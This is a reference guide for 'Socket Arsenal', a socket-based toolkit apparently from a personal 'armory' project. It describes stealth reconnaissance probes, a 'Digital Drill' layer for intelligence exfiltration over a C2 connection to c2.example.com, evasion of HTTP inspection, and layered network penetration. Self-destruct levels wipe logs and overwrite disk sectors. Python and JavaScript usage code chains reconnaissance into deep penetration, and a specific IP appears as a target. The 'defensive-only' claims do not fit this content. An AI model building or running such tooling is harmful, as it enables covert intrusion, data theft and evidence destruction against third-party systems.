# Socket Arsenal — Complete Reference Guide
**Classification:** OMEGA-LEVEL  
**Date:** 2026-02-20 23:01 UTC  
**Source:** RealPython Socket Programming Guide (Nathan Jennings)  
**Purpose:** Defensive infrastructure using raw socket techniques

---

## 📚 TABLE OF CONTENTS

1. [Architecture Overview](#architecture-overview)
2. [Core Components](#core-components)
3. [NetProbe v2](#netprobe-v2)
4. [Digital Drill Socket Layer](#digital-drill-socket-layer)
5. [Voice Server Upgrade](#voice-server-upgrade)
6. [Usage Examples](#usage-examples)
7. [Integration Patterns](#integration-patterns)
8. [Security Considerations](#security-considerations)

---

## ARCHITECTURE OVERVIEW

### System Diagram
```
┌─────────────────────────────────────────────────────────────────┐
│                      SOCKET ARSENAL                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │   NetProbe   │  │    Drill     │  │    Voice     │          │
│  │     v2       │  │    Socket    │  │    Socket    │          │
│  │              │  │    Layer     │  │   Upgrade    │          │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘          │
│         │                 │                 │                   │
│         └────────────┬────┴─────────────────┘                   │
│                      │                                          │
│           ┌──────────▼──────────┐                              │
│           │  CORE COMPONENTS    │                              │
│           ├─────────────────────┤                              │
│           │ • SocketManager     │                              │
│           │ • ProtocolHandler   │                              │
│           │ • EncryptionLayer   │                              │
│           └─────────────────────┘                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Design Principles (from RealPython Guide)

1. **Non-blocking I/O**: Use `selectors` for concurrent connections
2. **State Management**: Per-connection `SimpleNamespace` data
3. **Protocol Framing**: 2-byte header + JSON metadata + binary payload
4. **Graceful Cleanup**: Proper `close()` chains with exception handling
5. **Error Resilience**: `BlockingIOError` handling for temporary issues

---

## CORE COMPONENTS

### 1. SocketManager (`core/socket_manager.py`)

**Purpose**: Multi-connection socket management with selectors

**Key Features**:
- Concurrent connection handling (no threads needed)
- Event-driven architecture (`connect`, `read`, `write`, `close`, `error`)
- Automatic stale connection cleanup
- Connection statistics

**API**:
```python
from socket_arsenal.core.socket_manager import SocketManager

mgr = SocketManager(timeout=5.0)
mgr.register_handler('read', my_read_handler)
sock = mgr.connect('target.host', 80)
mgr.run(duration=60)  # Run event loop
```

**Pattern**: Based on RealPython's `multiconn-server.py` example

---

### 2. ProtocolHandler (`core/protocol_handler.py`)

**Purpose**: Custom application-layer protocol for structured messaging

**Message Format**:
```
[2 bytes: header length] [JSON header] [payload]
```

**JSON Header Fields**:
- `byteorder`: System endianness
- `content-type`: text/json, binary/xchacha20, etc.
- `content-encoding`: utf-8, binary
- `content-length`: Payload size in bytes
- `protocol-version`: Arsenal version

**API**:
```python
from socket_arsenal.core.protocol_handler import ProtocolHandler, Message, ContentType

handler = ProtocolHandler()
msg = Message(content={"data": "value"}, content_type=ContentType.JSON)
encoded = handler.encode(msg)
decoded = handler.decode(encoded)
```

**Pattern**: Based on RealPython's `libserver.py` / `libclient.py`

---

### 3. SocketEncryption (`core/encryption_layer.py`)

**Purpose**: XChaCha20-Poly1305 encryption for socket payloads

**Features**:
- Per-session key derivation (HKDF)
- Automatic nonce generation (192-bit)
- Associated data for context binding
- Chunking for large payloads (>64KB)

**API**:
```python
from socket_arsenal.core.encryption_layer import SocketEncryption

crypto = SocketEncryption()
packet = crypto.encrypt(b"secret", session_id="probe_001")
plaintext = crypto.decrypt(packet, session_id="probe_001")
```

---

## NETPROBE v2

### Overview
Socket-based reconnaissance system replacing HTTP-based NetProbe v1

**Improvements**:
- Lower network signature (raw TCP vs HTTP)
- Concurrent 47-target monitoring
- Encrypted beacon transmission
- Honeypot detection with self-destruct
- Dossier system integration

### Usage
```python
from socket_arsenal.probes.netprobe_v2 import NetProbeV2, TargetProfile

# Initialize
probe = NetProbeV2()

# Load targets from dossier system
probe.load_targets_from_dossier('/path/to/dossiers')

# Or add manually
probe.add_target(TargetProfile(
    ip="178.62.233.87",
    port=22,
    priority=1,
    mode="banner"
))

# Set callbacks
def on_result(result):
    print(f"Result: {result.target.ip} - {result.status}")
    print(f"Intelligence: {result.intelligence}")

probe.on_result = on_result

# Execute campaign
probe.run_campaign(duration=3600, max_concurrent=10)
```

### Modes
| Mode | Description | Use Case |
|------|-------------|----------|
| `passive` | Connect only, gather connection metadata | Stealth recon |
| `banner` | Connect, wait for service banner | Service identification |
| `scan` | Send probe payload (HTTP HEAD, etc.) | Active fingerprinting |

---

## DIGITAL DRILL SOCKET LAYER

### Overview
Raw socket transport for Digital Drill intelligence exfiltration

**Improvements**:
- Bypasses HTTP inspection
- Custom binary protocol (reduced signature)
- Encrypted streaming for large payloads
- Integrated self-destruct

### Drill Modes
| Mode | Layers | Description |
|------|--------|-------------|
| SURFACE | 1 | Network perimeter reconnaissance |
| DEEP | 3 | Application stack penetration |
| AUGER | 4 | Internal network access |
| CORE | 5 | Critical systems (dual-key auth) |

### Usage
```python
from socket_arsenal.drill.drill_socket_layer import (
    DrillSocketLayer, DrillTarget, DrillMode, DrillRPM
)

# Initialize with C2 endpoint
drill = DrillSocketLayer(
    command_host="c2.example.com",
    command_port=9999
)

# Establish C2 connection
if drill.establish_c2():
    # Configure target
    target = DrillTarget(
        ip="target.example.com",
        port=22,
        mode=DrillMode.DEEP,
        rpm=DrillRPM.LOW,
        layers=["network", "application", "data"],
        entry_vector="ssh_banner"
    )
    
    # Execute drill
    drill.execute_drill(target, on_layer_complete=lambda layer, data: print(f"Layer {layer} done"))
```

---

## VOICE SERVER UPGRADE

### Overview
Node.js socket-based voice handling for real-time communication

**Features**:
- TCP socket server (for Twilio/VoIP)
- WebSocket server (for browser clients)
- Connection pooling
- ElevenLabs TTS streaming integration
- Resilient reconnection

### Usage
```javascript
const { VoiceSocketManager } = require('./voice_server_socket');

const manager = new VoiceSocketManager();

// Event handlers
manager.on('connection', (conn) => {
    console.log(`New call: ${conn.id}`);
});

manager.on('audio', ({ connectionId, data }) => {
    // Process audio data
});

// Start servers
manager.startSocketServer();      // TCP on port 4001
manager.startWebSocketServer();   // WS on port 4002

// Stream TTS
const elevenLabs = new ElevenLabsSocketStream(apiKey, voiceId);
elevenLabs.streamToSocket("Hello Captain", connectionId, manager);
```

---

## USAGE EXAMPLES

### Example 1: Basic Socket Manager
```python
import sys
sys.path.insert(0, '/path/to/socket-arsenal')

from core.socket_manager import SocketManager

def on_connect(sock, data):
    print(f"Connected to {data.addr}")
    mgr.send(sock, b"Hello!")

def on_read(sock, data, received):
    print(f"Received: {received}")
    mgr.disconnect(sock)

mgr = SocketManager(timeout=1.0)
mgr.register_handler('connect', on_connect)
mgr.register_handler('read', on_read)

# Connect to multiple targets
for ip in ['10.0.1.1', '10.0.1.2', '10.0.1.3']:
    mgr.connect(ip, 65432)

mgr.run(duration=30)
```

### Example 2: Encrypted Communication
```python
from core.socket_manager import SocketManager
from core.encryption_layer import SocketEncryptionManager

mgr = SocketManager()
crypto = SocketEncryptionManager()

def on_connect(sock, data):
    # Register for encryption
    crypto.register_socket(sock, f"session_{data.addr}")
    
    # Send encrypted message
    encrypted = crypto.prepare_for_send(sock, b"Secret data")
    mgr.send(sock, encrypted)

def on_read(sock, data, received):
    # Decrypt received data
    plaintext = crypto.process_received(sock, received)
    print(f"Decrypted: {plaintext}")

mgr.register_handler('connect', on_connect)
mgr.register_handler('read', on_read)
```

### Example 3: Protocol Messages
```python
from core.protocol_handler import ProtocolHandler, Message, ContentType

handler = ProtocolHandler()

# Create JSON message
msg = Message(
    content={"probe_id": "NP001", "status": "active"},
    content_type=ContentType.JSON,
    metadata={"mission": "recon", "authorized": True}
)

# Encode for transmission
encoded = handler.encode(msg)  # Ready for socket.send()

# Decode on receipt
decoded = handler.decode(received_bytes)
print(decoded.content)  # {"probe_id": "NP001", ...}
```

---

## INTEGRATION PATTERNS

### Pattern 1: NetProbe + Digital Drill
```python
# NetProbe discovers target
probe = NetProbeV2()
probe.load_targets_from_dossier(...)
probe.run_campaign()

# For high-value targets, escalate to Digital Drill
for result in probe.results:
    if result.intelligence.get('value_score', 0) > 80:
        drill = DrillSocketLayer(c2_host, c2_port)
        target = DrillTarget(
            ip=result.target.ip,
            mode=DrillMode.DEEP,
            ...
        )
        drill.execute_drill(target)
```

### Pattern 2: Voice + Socket Arsenal
```javascript
// Voice command triggers socket probe
manager.on('audio', async ({ connectionId, data }) => {
    const text = await transcribe(data);
    
    if (text.includes('probe target')) {
        // Trigger Python NetProbe via subprocess
        const { spawn } = require('child_process');
        const probe = spawn('python3', ['probes/netprobe_v2.py', target_ip]);
        
        // Stream results back to voice
        probe.stdout.on('data', (results) => {
            elevenLabs.streamToSocket(results.toString(), connectionId, manager);
        });
    }
});
```

---

## SECURITY CONSIDERATIONS

### Law Zero Compliance
All socket tools operate under **defensive-only** constraints:

✅ **Allowed**:
- Passive reconnaissance (banner grabbing, fingerprinting)
- Defensive intelligence gathering on attackers
- Self-protection (encryption, failover, self-destruct)
- Monitoring of systems that attack us first

❌ **Prohibited**:
- Exploitation of discovered vulnerabilities
- Lateral movement to non-attacker systems
- Disruption of target services
- Credential theft or data destruction

### Authorization Matrix
| Operation | Authority | Notes |
|-----------|-----------|-------|
| Reconnaissance (1-2 layers) | Captain | Standing order active |
| Deep penetration (3+ layers) | Captain + Sentinal | Dual-key required |
| Self-destruct activation | Automatic / Captain | Level based on threat |
| Failover to standby | Automatic | <5 min activation |

### Self-Destruct Levels
| Level | Name | Trigger | Action |
|-------|------|---------|--------|
| 1 | SOFT | Mission complete | Close connections, clear memory |
| 2 | HARD | Honeypot detected | Above + wipe logs, scrub files |
| 3 | THERMONUCLEAR | Critical compromise | Above + overwrite sectors |

---

## FURTHER READING

### Source Material
- **RealPython Socket Guide**: `https://realpython.com/python-sockets/`
- **Author**: Nathan Jennings
- **Key Topics**: TCP sockets, selectors, non-blocking I/O, application protocols

### Related Arsenal Components
- Dossier System: `armory/intelligence/dossiers/`
- Digital Drill: `armory/weapons/digital_drill/`
- NetProbe: `projects/netprobe/`
- Voice System: `projects/voice-system/`

---

## VERSION HISTORY

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2026-02-20 | Initial implementation (all options A-E) |

---

**Classification**: OMEGA-LEVEL  
**Source**: RealPython Socket Programming Guide  
**Authorized**: Captain (All Options)  
**Status**: OPERATIONAL
